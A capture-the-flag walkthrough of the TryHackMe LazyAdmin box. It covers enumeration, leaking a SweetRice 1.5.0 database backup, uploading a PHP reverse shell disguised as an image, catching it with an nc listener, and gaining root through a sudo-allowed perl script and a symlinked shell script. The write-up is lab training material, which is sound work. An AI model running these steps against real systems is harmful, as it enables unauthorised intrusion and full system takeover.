# 🧠 TryHackMe: LazyAdmin Walkthrough

**Category**: Easy  
**Tags**: `web`, `reverse-shell`, `suid`, `perl`, `privesc`

---

## 🔍 Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oN nmap_initial.txt lazy.thm
````

Open Ports:

* `80/tcp` - Apache 2.4.18
* `22/tcp` - OpenSSH 7.2p2

### Gobuster

```bash
gobuster dir -u http://lazy.thm -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

Interesting paths:

* `/content/`
* `/content/as/` → Admin login panel

---

## 🛠️ Exploitation

### CMS Detection: SweetRice

CMS identified as **SweetRice**, version `1.5.0`. Publicly known exploits available:

* Backup file disclosure
* Authenticated file upload → RCE

### Leaked Backup File

```bash
curl http://lazy.thm/content/inc/mysql_backup/<redacted>.sql
```

Contained:

* Username: `manager`
* Password hash: `<redacted>`

Cracked hash → plaintext password: **`<redacted>`**

### Authenticated Upload

Logged in at `/content/as/`
Used upload endpoint:

```
/content/as/?type=media_center&mode=upload
```

Uploaded PHP reverse shell disguised as `.jpg`. Navigated to shell via public file path.

---

## 🐚 Reverse Shell

Set up a listener:

```bash
nc -lvnp 4444
```

Triggered reverse shell through browser.

Upgraded shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Shell as `www-data`.

---

## ⚡ Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Script contents:

```perl
system("sh", "/etc/copy.sh");
```

### Exploit:

```bash
echo "/bin/bash" > /tmp/rootme.sh
chmod +x /tmp/rootme.sh
ln -sf /tmp/rootme.sh /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

Now root.

---

## 🏁 Flags

```
User Flag: <REDACTED>
Root Flag: <REDACTED>
```

---

## ✅ Key Takeaways

* Always check `/content/` paths when dealing with CMS installs
* SweetRice has known and easy-to-exploit vulnerabilities
* Perl scripts + `sudo` = privilege escalation opportunity
* Upload restrictions can sometimes be bypassed by misnamed extensions (e.g. `.php.jpg`)

---


